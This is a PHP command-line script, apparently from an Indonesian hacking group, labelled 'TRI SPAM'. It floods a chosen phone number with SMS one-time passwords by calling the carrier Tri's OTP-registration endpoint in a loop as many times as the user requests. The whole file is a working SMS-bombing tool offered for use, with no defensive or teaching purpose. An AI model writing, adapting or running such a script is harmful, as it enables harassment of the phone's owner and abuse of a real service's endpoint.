<?php
//coded by Momos
//made with love
function clear(){
	//linux
	system('clear')
	or 
	//windows
	system('cls');
}
clear();
function banner(){
	echo "
______________________ 
__  __ \__  __/__  __ \   
_  / / /_  /  __  /_/ /
/ /_/ /_  /   _  ____/ 
\____/ /_/    /_/ TRI SPAM !     
Coded By Momos Ft. Arikun - Hidden Ghost Team - IndoSec
example : 0895xxxxxxxx                       
	\n";
}
banner();
function momos(){
	$green = "\e[0;32m";
    $red = "\e[31;1m";
echo "Input Number : "; 
$number = trim(fgets(STDIN));
echo "Jumlah : ";
$jumlah = trim(fgets(STDIN));
echo "\n";
$url = "https://registrasi.tri.co.id/daftar/generateOTP";
$momos = $jumlah;
for ($i=1; $i<=$momos; $i++){
	sleep(3);
$ch = curl_init();
CURL_SETOPT($ch, CURLOPT_URL, $url);
CURL_SETOPT($ch, CURLOPT_POST, 1);
CURL_SETOPT($ch, CURLOPT_POSTFIELDS, "msisdn=$number");
CURL_SETOPT($ch, CURLOPT_RETURNTRANSFER, true);
CURL_SETOPT($ch, CURLOPT_HTTPHEADER, array('User-Agent: Mozilla'));
$exec = curl_exec($ch);
curl_close($ch);
$dec = json_decode($exec, true);
if($dec['status'] == "success" ){
	echo "".$green." [".$i."] ".$number." => SEND\n";
} else {
	echo "".$red."[".$i."] ".$number." => Failed!\n";
}
}
}
momos();
?>
